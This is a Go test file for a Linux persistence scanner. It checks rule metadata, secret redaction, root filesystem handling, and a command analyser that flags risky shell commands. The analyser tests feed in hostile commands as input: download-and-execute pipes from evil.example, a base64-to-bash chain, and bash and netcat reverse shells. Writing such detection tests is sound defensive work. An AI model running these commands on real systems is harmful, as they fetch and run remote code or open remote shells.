package persistence

import (
	"context"
	"os"
	"path/filepath"
	"testing"

	"github.com/Lutfifakee-Project/ronda/internal/finding"
)

// --- rule registry tests -------------------------------------------------

func TestRuleRegistryComplete(t *testing.T) {
	ids := RuleIDs()
	if len(ids) == 0 {
		t.Fatal("rule registry is empty")
	}
	for _, id := range ids {
		m, ok := RuleMetadata(id)
		if !ok {
			t.Fatalf("RuleIDs returned %q but RuleMetadata cannot resolve it", id)
		}
		if m.ID != id {
			t.Fatalf("registry key %q has meta ID %q", id, m.ID)
		}
		if m.Name == "" {
			t.Errorf("rule %q has no Name", id)
		}
		if m.Category == "" {
			t.Errorf("rule %q has no Category", id)
		}
		if m.Description == "" {
			t.Errorf("rule %q has no Description", id)
		}
		if m.DefaultSeverity.Rank() < finding.Info.Rank() || m.DefaultSeverity.Rank() > finding.Critical.Rank() {
			t.Errorf("rule %q has invalid severity %q", id, m.DefaultSeverity)
		}
		if m.FPNotes == "" {
			t.Errorf("rule %q has no FPNotes; precision decisions must be documented", id)
		}
		for _, mitre := range m.MITRE {
			if len(mitre) < 5 || mitre[0] != 'T' {
				t.Errorf("rule %q has malformed MITRE id %q", id, mitre)
			}
		}
	}
}

func TestRuleCategoriesValid(t *testing.T) {
	valid := map[string]bool{}
	for _, c := range Categories() {
		valid[c] = true
	}
	for _, id := range RuleIDs() {
		m, _ := RuleMetadata(id)
		if !valid[m.Category] {
			t.Errorf("rule %q uses unregistered category %q", id, m.Category)
		}
	}
}

// --- command analysis tests ----------------------------------------------

func TestAnalyzeCommandDownloadExec(t *testing.T) {
	tr := AnalyzeCommand("curl -fsSL http://evil.example/x.sh | sh")
	if !tr.Downloads || !tr.PipeIntoExec {
		t.Fatalf("expected download-exec chain, got %+v", tr)
	}
	if len(tr.URLs) != 1 {
		t.Errorf("expected one URL, got %v", tr.URLs)
	}
}

func TestAnalyzeCommandEncoded(t *testing.T) {
	tr := AnalyzeCommand("echo aGVsbG8= | base64 -d | bash")
	if !tr.Encoded || !tr.PipeIntoExec {
		t.Fatalf("expected encoded exec chain, got %+v", tr)
	}
}

func TestAnalyzeCommandWritablePath(t *testing.T) {
	tr := AnalyzeCommand("/tmp/.x/payload --daemon")
	if len(tr.WritablePaths) == 0 {
		t.Fatalf("expected writable path trait, got %+v", tr)
	}
	if len(tr.HiddenPaths) == 0 {
		t.Errorf("expected hidden path trait, got %+v", tr)
	}
}

func TestAnalyzeCommandReverseShell(t *testing.T) {
	tr := AnalyzeCommand("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
	if !tr.ReverseShell {
		t.Fatalf("expected reverse shell trait, got %+v", tr)
	}
	tr2 := AnalyzeCommand("nc -e /bin/sh 10.0.0.1 4444")
	if !tr2.ReverseShell {
		t.Fatalf("expected nc reverse shell trait, got %+v", tr2)
	}
}

func TestAnalyzeCommandEvalDownload(t *testing.T) {
	tr := AnalyzeCommand(`eval "$(curl -s http://evil.example/i)"`)
	if !tr.Downloads || !tr.PipeIntoExec {
		t.Fatalf("expected eval download-exec, got %+v", tr)
	}
}

func TestAnalyzeCommandPlainCommandsNotSuspicious(t *testing.T) {
	for _, cmd := range []string{
		"/usr/bin/certbot -q renew",
		"/usr/local/bin/backup.sh --weekly",
		"rm -rf /var/cache/app/*",
		"systemctl restart nginx",
	} {
		tr := AnalyzeCommand(cmd)
		if tr.Downloads && tr.PipeIntoExec {
			t.Errorf("%q misclassified as download-exec", cmd)
		}
		if tr.ReverseShell || tr.Encoded {
			t.Errorf("%q misclassified: %+v", cmd, tr)
		}
		if len(tr.WritablePaths) != 0 {
			t.Errorf("%q should not reference writable paths: %+v", cmd, tr)
		}
	}
}

func TestStripComment(t *testing.T) {
	cases := []struct{ in, want string }{
		{"# full comment", ""},
		{"PATH=/usr/bin # trailing", "PATH=/usr/bin"},
		{`echo "# not a comment"`, `echo "# not a comment"`},
		{"curl 'http://x/#frag' | sh", "curl 'http://x/#frag' | sh"},
	}
	for _, c := range cases {
		if got := stripComment(c.in); got != c.want {
			t.Errorf("stripComment(%q) = %q, want %q", c.in, got, c.want)
		}
	}
}

func TestRedactSecrets(t *testing.T) {
	out := RedactSecrets("connect password=hunter2 to db")
	if got := out; contains(out, "hunter2") {
		t.Fatalf("password leaked: %q", got)
	}
	out = RedactSecrets("-----BEGIN RSA PRIVATE KEY-----")
	if contains(out, "RSA PRIVATE KEY-----") && !contains(out, "[PRIVATE KEY REDACTED]") {
		t.Fatalf("private key marker not redacted: %q", out)
	}
	out = RedactSecrets("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIlongkeymaterial user@host")
	if contains(out, "AAAAC3NzaC1lZDI1NTE5AAAAI") {
		t.Fatalf("key material leaked: %q", out)
	}
	if !contains(out, "ssh-ed25519") {
		t.Errorf("algorithm should be preserved: %q", out)
	}
}

func contains(s, sub string) bool {
	return len(s) >= len(sub) && (func() bool {
		for i := 0; i+len(sub) <= len(s); i++ {
			if s[i:i+len(sub)] == sub {
				return true
			}
		}
		return false
	})()
}

// --- RootFS tests ---------------------------------------------------------

func TestRootFSPaths(t *testing.T) {
	live := NewRootFS("")
	if !live.LiveHost() {
		t.Fatal("empty root must be live host")
	}
	if got := live.Physical("/etc/cron.d/x"); got != "/etc/cron.d/x" {
		t.Fatalf("live host physical = %q", got)
	}
	offline := NewRootFS("/mnt/root")
	if offline.LiveHost() {
		t.Fatal("non-empty root must not be live host")
	}
	if got := offline.Physical("/etc/cron.d/x"); got != "/mnt/root/etc/cron.d/x" {
		t.Fatalf("offline physical = %q", got)
	}
	if !offline.contains("/mnt/root/etc/passwd") || offline.contains("/mnt/other/etc/passwd") {
		t.Fatal("containment check broken")
	}
}

func TestRootFSSymlinkEscape(t *testing.T) {
	root := t.TempDir()
	if err := os.MkdirAll(filepath.Join(root, "etc"), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.Symlink("../../../outside-target", filepath.Join(root, "etc", "escape")); err != nil {
		t.Skip("symlinks unavailable:", err)
	}
	fs := NewRootFS(root)
	_, contained := fs.resolve("/etc/escape")
	if contained {
		t.Fatal("relative symlink escaping the root must not be contained")
	}
}

func TestFileModeRendering(t *testing.T) {
	cases := []struct {
		mode os.FileMode
		want string
	}{
		{0o644, "-rw-r--r--"},
		{0o755, "-rwxr-xr-x"},
		{os.ModeDir | os.ModeSticky | 0o777, "drwxrwxrwt"},
	}
	for _, c := range cases {
		if got := fileMode(c.mode); got != c.want {
			t.Errorf("fileMode(%o) = %q, want %q", c.mode, got, c.want)
		}
	}
}

// --- shared fixture helpers ----------------------------------------------

// fixtureRoot is a synthetic root filesystem for persistence tests.
type fixtureRoot struct {
	t   *testing.T
	Dir string
}

func newFixtureRoot(t *testing.T) *fixtureRoot {
	t.Helper()
	return &fixtureRoot{t: t, Dir: t.TempDir()}
}

func (f *fixtureRoot) mkdirs(rel string) {
	f.t.Helper()
	if err := os.MkdirAll(filepath.Join(f.Dir, rel), 0o755); err != nil {
		f.t.Fatal(err)
	}
}

func (f *fixtureRoot) write(rel, content string) string {
	f.t.Helper()
	full := filepath.Join(f.Dir, rel)
	if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
		f.t.Fatal(err)
	}
	if err := os.WriteFile(full, []byte(content), 0o644); err != nil {
		f.t.Fatal(err)
	}
	return full
}

func (f *fixtureRoot) writeFileMode(rel, content string, mode os.FileMode) {
	f.t.Helper()
	full := f.write(rel, content)
	if err := os.Chmod(full, mode); err != nil {
		f.t.Fatal(err)
	}
}

func (f *fixtureRoot) writeExecutable(rel, content string) {
	f.t.Helper()
	f.writeFileMode(rel, content, 0o755)
}

func (f *fixtureRoot) symlink(rel, target string) {
	f.t.Helper()
	full := filepath.Join(f.Dir, rel)
	if err := os.MkdirAll(filepath.Dir(full), 0o755); err != nil {
		f.t.Fatal(err)
	}
	if err := os.Symlink(target, full); err != nil {
		f.t.Fatal(err)
	}
}

func (f *fixtureRoot) chmodDir(rel string, mode os.FileMode) {
	f.t.Helper()
	if err := os.Chmod(filepath.Join(f.Dir, rel), mode); err != nil {
		f.t.Fatal(err)
	}
}

// basePasswd gives fixtures a deterministic account database.
const basePasswd = `root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu User:/home/ubuntu:/bin/bash
svc:x:900:900:Service Account:/var/lib/svc:/usr/sbin/nologin
`

func (f *fixtureRoot) addPasswd() { f.write("/etc/passwd", basePasswd) }

func (f *fixtureRoot) addGroups() {
	f.write("/etc/group", "root:x:0:\nubuntu:x:1000:\nsvc:x:900:\nsudo:x:27:ubuntu\nwheel:x:10:root\n")
}

// scanFixture runs the engine over the fixture and returns the report.
func (f *fixtureRoot) scan() Report {
	f.t.Helper()
	return Scan(testContext(), f.Dir)
}

// testContext returns a background context for test scans.
func testContext() context.Context { return context.Background() }

// findingsByRule indexes findings by rule ID.
func findingsByRule(rep Report) map[string][]finding.Finding {
	out := map[string][]finding.Finding{}
	for _, f := range rep.Findings {
		out[f.Rule] = append(out[f.Rule], f)
	}
	return out
}

// countRule asserts exactly n findings for rule.
func countRule(t *testing.T, rep Report, rule string, n int) {
	t.Helper()
	got := 0
	for _, f := range rep.Findings {
		if f.Rule == rule {
			got++
		}
	}
	if got != n {
		t.Fatalf("rule %s: got %d findings, want %d\n%+v", rule, got, n, rep.Findings)
	}
}
